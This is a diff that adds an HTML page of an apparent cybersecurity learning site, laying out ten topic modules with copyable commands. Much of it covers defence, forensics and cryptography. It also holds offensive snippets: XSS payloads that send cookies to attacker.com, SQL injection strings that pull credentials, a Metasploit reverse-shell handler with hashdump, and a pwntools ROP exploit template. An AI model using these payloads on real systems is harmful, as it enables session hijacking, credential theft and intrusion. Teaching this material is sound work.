@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Topics — ARC-NETWORK</title>
+<link rel="stylesheet" href="/css/main.css">
+<style>
+  .topic-search{width:100%;background:rgba(4,2,14,.8);border:1px solid var(--border2);color:var(--text);padding:12px 18px 12px 44px;font-family:var(--font-mono);font-size:.85rem;outline:none;transition:border-color .2s;margin-bottom:2rem;}
+  .topic-search:focus{border-color:var(--accent-b);box-shadow:0 0 0 2px rgba(124,58,237,.15);}
+  .search-wrap{position:relative;}
+  .search-icon{position:absolute;left:14px;top:50%;transform:translateY(-50%);color:var(--muted);pointer-events:none;}
+  .filter-bar{display:flex;gap:.5rem;flex-wrap:wrap;margin-bottom:2rem;}
+  .filt-btn{padding:5px 14px;font-family:var(--font-mono);font-size:.62rem;letter-spacing:1.5px;background:transparent;border:1px solid var(--border2);color:var(--muted);cursor:pointer;transition:all .2s;text-transform:uppercase;}
+  .filt-btn:hover,.filt-btn.active{border-color:var(--accent-b);color:var(--accent-b);background:rgba(124,58,237,.07);}
+  .t-card{background:var(--surface);border:1px solid var(--border2);transition:all .3s;overflow:hidden;margin-bottom:1rem;position:relative;}
+  .t-card::before{content:'';position:absolute;left:0;top:0;bottom:0;width:3px;background:linear-gradient(to bottom,var(--accent),var(--cyan));transform:scaleY(0);transform-origin:top;transition:transform .35s var(--ease);}
+  .t-card:hover::before,.t-card.open::before{transform:scaleY(1);}
+  .t-card:hover,.t-card.open{border-color:rgba(124,58,237,.4);box-shadow:0 4px 30px rgba(124,58,237,.12);}
+  .t-header{padding:1.4rem 1.5rem;display:flex;align-items:center;gap:1rem;cursor:pointer;user-select:none;}
+  .t-num{font-family:var(--font-head);font-size:2rem;font-weight:900;background:linear-gradient(135deg,rgba(124,58,237,.3),rgba(6,182,212,.2));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;min-width:55px;}
+  .t-name{font-family:var(--font-head);font-size:.88rem;color:var(--text);letter-spacing:2px;margin-bottom:5px;}
+  .t-chev{color:var(--muted);font-size:1.5rem;margin-left:auto;transition:transform .35s var(--ease);line-height:1;font-family:var(--font-mono);}
+  .t-body{max-height:0;overflow:hidden;transition:max-height .5s cubic-bezier(0,1,.35,1);}
+  .t-body-inner{padding:1.5rem;border-top:1px solid var(--border2);color:var(--muted);font-size:.9rem;line-height:1.75;}
+  .t-body-inner h4{font-family:var(--font-mono);font-size:.65rem;color:var(--cyan-b);letter-spacing:3px;text-transform:uppercase;margin:1.2rem 0 .5rem;}
+  .t-body-inner h4:first-child{margin-top:0;}
+  .cmd-wrap{position:relative;margin:.5rem 0 1rem;}
+  .cmd-wrap pre{display:block;font-family:var(--font-mono);background:rgba(4,2,14,.9);border:1px solid var(--border2);border-left:3px solid var(--accent-b);padding:.9rem 3.5rem .9rem 1.2rem;font-size:.75rem;color:var(--cyan);overflow-x:auto;white-space:pre;line-height:1.65;margin:0;}
+  .copy-btn{position:absolute;right:8px;top:8px;padding:3px 10px;font-family:var(--font-mono);font-size:.58rem;background:rgba(124,58,237,.15);border:1px solid rgba(124,58,237,.3);color:var(--accent-b);cursor:pointer;transition:all .2s;letter-spacing:1px;}
+  .copy-btn:hover{background:rgba(124,58,237,.35);}
+  .no-results{text-align:center;padding:4rem 2rem;font-family:var(--font-mono);color:var(--muted);font-size:.8rem;letter-spacing:2px;}
+</style>
+</head>
+<body>
+<div class="page-wrap">
+<div class="page-content">
+  <div class="section-head">
+    <div class="section-eyebrow">// knowledge base — 10 modules</div>
+    <h2 class="section-title">Cybersecurity <em>Topics</em></h2>
+    <div class="section-line"></div>
+  </div>
+
+  <div class="search-wrap">
+    <span class="search-icon">🔍</span>
+    <input type="text" class="topic-search" id="topic-search" placeholder="SEARCH TOPICS..." oninput="filterTopics()">
+  </div>
+  <div class="filter-bar" id="filter-bar">
+    <button class="filt-btn active" onclick="setFilter('ALL',this)">ALL</button>
+    <button class="filt-btn" onclick="setFilter('OFFENSIVE',this)">OFFENSIVE</button>
+    <button class="filt-btn" onclick="setFilter('DEFENSIVE',this)">DEFENSIVE</button>
+    <button class="filt-btn" onclick="setFilter('ADVANCED',this)">ADVANCED</button>
+    <button class="filt-btn" onclick="setFilter('WEB',this)">WEB</button>
+    <button class="filt-btn" onclick="setFilter('FORENSICS',this)">FORENSICS</button>
+    <button class="filt-btn" onclick="setFilter('RECON',this)">RECON</button>
+    <button class="filt-btn" onclick="setFilter('ELITE',this)">ELITE</button>
+  </div>
+
+  <div id="topics-list"></div>
+  <div id="no-results" class="no-results" style="display:none">NO TOPICS MATCH YOUR SEARCH</div>
+</div>
+</div>
+
+<script src="/js/api.js"></script>
+<script src="/js/ui.js"></script>
+<script src="/js/nav.js"></script>
+<script>
+var TOPICS = [
+  {id:1,name:'PENETRATION TESTING',tag:'tag-red',label:'OFFENSIVE',
+   text:'Structured simulation of real-world cyberattacks across five phases: Reconnaissance → Scanning → Exploitation → Post-Exploitation → Reporting. The goal is to identify vulnerabilities before attackers do.',
+   sections:[
+     {h:'RECONNAISSANCE',code:'nmap -sC -sV -O -p- target_ip\ntheHarvester -d target.com -b all\nwhois target.com\nrecon-ng -w workspace\namass enum -d target.com'},
+     {h:'METASPLOIT EXPLOITATION',code:'msfconsole\nuse exploit/multi/handler\nset payload windows/meterpreter/reverse_tcp\nset LHOST your_ip\nset LPORT 4444\nexploit -j'},
+     {h:'POST EXPLOITATION',code:'sysinfo\ngetuid\nhashdump\nrun post/multi/recon/local_exploit_suggester\nrun post/windows/gather/credentials/credential_collector'},
+   ]},
+  {id:2,name:'NETWORK SECURITY',tag:'tag-blue',label:'DEFENSIVE',
+   text:'Policies, tools and techniques to detect, prevent, and respond to unauthorized network access. Covers firewalls, IDS/IPS, VPN, segmentation, and deep packet inspection.',
+   sections:[
+     {h:'PACKET ANALYSIS',code:'tcpdump -i eth0 -w capture.pcap\ntcpdump -r capture.pcap -nn "tcp port 80"\nnetstat -tulnp\nss -tulnp'},
+     {h:'IPTABLES HARDENING',code:'iptables -P INPUT DROP\niptables -P FORWARD DROP\niptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT\niptables -A INPUT -p tcp --dport 22 -j ACCEPT\niptables -A INPUT -p tcp --dport 443 -j ACCEPT\niptables-save > /etc/iptables/rules.v4'},
+     {h:'NMAP ADVANCED',code:'nmap -sS -T4 -A -v target\nnmap -sU --top-ports 200 target\nnmap --script vuln target\nnmap -sV --version-intensity 9 target'},
+   ]},
+  {id:3,name:'CRYPTOGRAPHY',tag:'tag-green',label:'CORE',
+   text:'Mathematical foundations of all secure communication: symmetric/asymmetric encryption, hashing, digital signatures, PKI, and TLS. Everything secure is built on this.',
+   sections:[
+     {h:'OPENSSL KEY MANAGEMENT',code:'openssl genrsa -out private.pem 4096\nopenssl rsa -in private.pem -pubout -out public.pem\nopenssl req -new -x509 -key private.pem -out cert.pem -days 365\nopenssl enc -aes-256-cbc -salt -pbkdf2 -in file.txt -out file.enc'},
+     {h:'HASHING & VERIFICATION',code:'sha256sum file.iso\nsha512sum file.iso\necho -n "password" | sha256sum\nopenssl dgst -sha256 -sign private.pem -out sig.bin file.txt\nopenssl dgst -sha256 -verify public.pem -signature sig.bin file.txt'},
+   ]},
+  {id:4,name:'REVERSE ENGINEERING',tag:'tag-red',label:'ADVANCED',
+   text:'Analyzing compiled binaries to understand behavior without source code. Core skill for malware analysis, vulnerability research, and CTF competitions.',
+   sections:[
+     {h:'STATIC ANALYSIS',code:'file malware.bin\nstrings malware.bin | grep -iE "http|cmd|exec|password"\nradare2 -A malware.bin\nobjdump -d malware.bin | less\nreadelf -a binary\nexiftool malware.exe'},
+     {h:'GDB DYNAMIC ANALYSIS',code:'gdb ./binary\n(gdb) break main\n(gdb) run\n(gdb) disassemble main\n(gdb) info registers\n(gdb) x/20x $rsp\n(gdb) ni'},
+   ]},
+  {id:5,name:'WEB APPLICATION SECURITY',tag:'tag-warn',label:'WEB',
+   text:'OWASP Top 10: SQLi, XSS, CSRF, SSRF, broken auth, XXE, insecure deserialization. The web is the largest attack surface in modern infrastructure.',
+   sections:[
+     {h:'SQL INJECTION',code:'sqlmap -u "http://target.com/page?id=1" --dbs --batch\n# Manual payloads:\n\' OR \'1\'=\'1\' --\n\' UNION SELECT null,table_name FROM information_schema.tables --\n\' UNION SELECT null,username,password FROM users --'},
+     {h:'XSS PAYLOADS',code:'# Reflected\n<script>document.location=\'//attacker.com/?\'+document.cookie</script>\n"><img src=x onerror=fetch(\'//attacker.com/?c=\'+btoa(document.cookie))>\n# CSP bypass\n<script src="https://trusted-cdn.com/jsonp?callback=alert(1)//"></script>'},
+     {h:'BURP SUITE WORKFLOW',code:'# 1. Set browser proxy: 127.0.0.1:8080\n# 2. Intercept in Proxy tab\n# 3. Repeater: Ctrl+R — manual testing\n# 4. Intruder: Ctrl+I — fuzzing/brute\n# 5. Scanner — active vuln scan\n# 6. Report from Dashboard'},
+   ]},
+  {id:6,name:'MALWARE ANALYSIS',tag:'tag-red',label:'FORENSICS',
+   text:'Static, dynamic, and behavioral analysis of malicious software. Essential for building effective defenses and conducting incident response.',
+   sections:[
+     {h:'SANDBOX ANALYSIS',code:'cuckoo submit malware.exe\ncuckoo submit --timeout 120 malware.exe\n# FLOSS — extract obfuscated strings\nfloss malware.exe > strings.txt\n# PE file analysis\npe-sieve.exe --pid 1234'},
+     {h:'YARA DETECTION RULES',code:'rule Ransomware_Generic {\n  meta:\n    author = "ARUNACHALAM"\n  strings:\n    $s1 = "Your files are encrypted" nocase\n    $s2 = ".onion" ascii\n    $s3 = "bitcoin" nocase wide\n    $ext = /\\.(locked|encrypted|crypted)$/\n  condition:\n    2 of ($s*) or $ext\n}'},
+   ]},
+  {id:7,name:'OSINT TECHNIQUES',tag:'tag-blue',label:'RECON',
+   text:'Collecting and correlating publicly available intelligence. From target profiling to threat hunting — OSINT is the backbone of every effective recon phase.',
+   sections:[
+     {h:'TOOLCHAIN',code:'# Shodan\nshodan search "port:22 country:IN org:Airtel"\nshodan host 8.8.8.8\n# theHarvester\ntheHarvester -d target.com -b linkedin,twitter,google\n# Amass\namass enum -passive -d target.com -o output.txt'},
+     {h:'GOOGLE DORKS',code:'site:target.com filetype:pdf\nsite:target.com filetype:xlsx OR filetype:csv\ninurl:admin site:target.com\nintitle:"index of" "parent directory" site:target.com\nsite:pastebin.com "target.com" "password"'},
+   ]},
+  {id:8,name:'DIGITAL FORENSICS',tag:'tag-green',label:'INVESTIGATION',
+   text:'Scientific recovery and analysis of digital evidence. Disk imaging, file carving, memory forensics, log analysis, and chain-of-custody procedures.',
+   sections:[
+     {h:'DISK IMAGING',code:'dd if=/dev/sda of=/mnt/evidence/disk.img bs=4M status=progress conv=sync,noerror\nsha256sum /dev/sda > disk.img.sha256\nmount -o ro,loop disk.img /mnt/analysis\nforemost -i disk.img -o /mnt/carved'},
+     {h:'MEMORY FORENSICS — VOLATILITY 3',code:'vol -f memory.dmp windows.info\nvol -f memory.dmp windows.pslist\nvol -f memory.dmp windows.netscan\nvol -f memory.dmp windows.malfind\nvol -f memory.dmp windows.dumpfiles --pid 1234'},
+   ]},
+  {id:9,name:'SOCIAL ENGINEERING',tag:'tag-warn',label:'HUMAN',
+   text:'Exploiting human psychology to bypass technical controls. The most devastating attacks combine technical exploitation with social manipulation.',
+   sections:[
+     {h:'PHISHING EMAIL ANALYSIS',code:'# Check SPF/DKIM/DMARC headers\nReceived-SPF: fail → domain mismatch\nDKIM-Signature: verify with public key\n# Check domain\nwhois phishing-domain.com | grep "Creation Date"\n# Unshorten links safely\ncurl -sI "http://suspicious.link" | grep Location'},
+     {h:'DEFENSE CHECKLIST',code:'[✓] Verify sender domain carefully (not just display name)\n[✓] Hover ALL links before clicking\n[✓] Never enter credentials from emailed links\n[✓] Enable hardware MFA (YubiKey > SMS)\n[✓] Use password manager — unique per site\n[✓] Report suspicious contacts to security team'},
+   ]},
+  {id:10,name:'CTF & EXPLOIT DEVELOPMENT',tag:'tag-red',label:'ELITE',
+   text:'Binary exploitation: buffer overflows, format strings, ROP chains, heap exploitation, kernel pwn. The pinnacle of offensive security research.',
+   sections:[
+     {h:'BUFFER OVERFLOW — 64-BIT',code:'# Find offset\npython3 -c "from pwn import *; print(cyclic(200))" | ./vuln\npython3 -c "from pwn import *; print(cyclic_find(0x6161616b))"\n# Check protections\nchecksec --file=./binary'},
+     {h:'PWNTOOLS EXPLOIT TEMPLATE',code:'from pwn import *\ncontext.arch = \'amd64\'\np = remote(\'ctf.server.com\', 1337)\nelf = ELF(\'./target\')\nlibc = ELF(\'./libc.so.6\')\noffset = 64\nrop = ROP(elf)\npayload = flat(\n    b\'A\' * offset,\n    rop.ret.address,\n    rop.find_gadget([\'pop rdi\',\'ret\'])[0],\n    elf.got[\'puts\'],\n    elf.plt[\'puts\']\n)\np.sendline(payload)\np.interactive()'},
+   ]},
+];
+
+var currentFilter = 'ALL';
+
+function escHtml(s){
+  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+function render(list){
+  var container = document.getElementById('topics-list');
+  var noResults = document.getElementById('no-results');
+  if(!list.length){
+    container.innerHTML='';
+    noResults.style.display='block';
+    return;
+  }
+  noResults.style.display='none';
+  var html='';
+  for(var i=0;i<list.length;i++){
+    var t=list[i];
+    var num=String(t.id).padStart(2,'0');
+    var sections='';
+    for(var j=0;j<t.sections.length;j++){
+      var s=t.sections[j];
+      var cid='c'+t.id+''+j;
+      sections+='<h4>'+s.h+'</h4><div class="cmd-wrap"><pre id="'+cid+'">'+escHtml(s.code)+'</pre><button class="copy-btn" onclick="copyCode(\''+cid+'\',this)">COPY</button></div>';
+    }
+    html+='<div class="t-card" id="tc-'+t.id+'">'
+      +'<div class="t-header" onclick="toggle('+t.id+')">'
+      +'<div class="t-num">'+num+'</div>'
+      +'<div style="flex:1;min-width:0">'
+      +'<div class="t-name">'+t.name+'</div>'
+      +'<span class="tag '+t.tag+'">'+t.label+'</span>'
+      +'</div>'
+      +'<span class="t-chev" id="chev-'+t.id+'">+</span>'
+      +'</div>'
+      +'<div class="t-body" id="tb-'+t.id+'">'
+      +'<div class="t-body-inner"><p style="margin-bottom:1rem">'+t.text+'</p>'+sections+'</div>'
+      +'</div>'
+      +'</div>';
+  }
+  container.innerHTML=html;
+}
+
+function toggle(id){
+  var body=document.getElementById('tb-'+id);
+  var card=document.getElementById('tc-'+id);
+  var chev=document.getElementById('chev-'+id);
+  var isOpen=body.style.maxHeight && body.style.maxHeight!=='0px';
+  // close all
+  var allBodies=document.querySelectorAll('.t-body');
+  for(var i=0;i<allBodies.length;i++) allBodies[i].style.maxHeight='0px';
+  var allCards=document.querySelectorAll('.t-card');
+  for(var i=0;i<allCards.length;i++) allCards[i].classList.remove('open');
+  var allChevs=document.querySelectorAll('.t-chev');
+  for(var i=0;i<allChevs.length;i++){ allChevs[i].textContent='+'; allChevs[i].style.transform='rotate(0deg)'; }
+  // open if was closed
+  if(!isOpen){
+    body.style.maxHeight=(body.scrollHeight+300)+'px';
+    card.classList.add('open');
+    chev.textContent='×';
+    chev.style.transform='rotate(0deg)';
+  }
+}
+
+function copyCode(id,btn){
+  var el=document.getElementById(id);
+  var text=el.textContent||el.innerText;
+  if(navigator.clipboard){
+    navigator.clipboard.writeText(text).then(function(){
+      btn.textContent='✓ COPIED'; btn.style.color='var(--green)';
+      setTimeout(function(){ btn.textContent='COPY'; btn.style.color=''; },2000);
+    });
+  } else {
+    var ta=document.createElement('textarea');
+    ta.value=text; document.body.appendChild(ta); ta.select();
+    document.execCommand('copy'); document.body.removeChild(ta);
+    btn.textContent='✓ COPIED'; btn.style.color='var(--green)';
+    setTimeout(function(){ btn.textContent='COPY'; btn.style.color=''; },2000);
+  }
+}
+
+function setFilter(label,btn){
+  currentFilter=label;
+  var btns=document.querySelectorAll('.filt-btn');
+  for(var i=0;i<btns.length;i++) btns[i].classList.remove('active');
+  btn.classList.add('active');
+  filterTopics();
+}
+
+function filterTopics(){
+  var q=document.getElementById('topic-search').value.toLowerCase();
+  var list=TOPICS;
+  if(currentFilter!=='ALL') list=list.filter(function(t){ return t.label===currentFilter; });
+  if(q) list=list.filter(function(t){ return t.name.toLowerCase().indexOf(q)>=0||t.text.toLowerCase().indexOf(q)>=0||t.label.toLowerCase().indexOf(q)>=0; });
+  render(list);
+}
+
+render(TOPICS);
+</script>
+</body>
+</html>
